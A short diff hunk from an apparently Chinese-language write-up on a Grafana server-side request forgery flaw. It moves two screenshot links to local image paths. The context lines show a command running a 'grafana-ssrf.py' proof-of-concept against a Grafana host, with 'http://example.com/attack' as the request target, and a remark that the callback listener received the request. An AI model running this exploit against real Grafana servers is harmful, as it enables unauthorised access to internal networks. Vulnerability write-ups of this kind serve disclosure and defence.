@@ -34,11 +34,11 @@ org_role = Admin
 python grafana-ssrf.py -H http://your-ip:3000 -u http://example.com/attack
 ```
 
-![image-20220705162041577](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202207051620666.png)
+![image-20220705162041577](./images/202207051620666.png)
 
 可见，反连平台已成功收到了HTTP请求：
 
-![image-20220705162221979](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202207051622042.png)
+![image-20220705162221979](./images/202207051622042.png)
 
 ## 漏洞POC
 
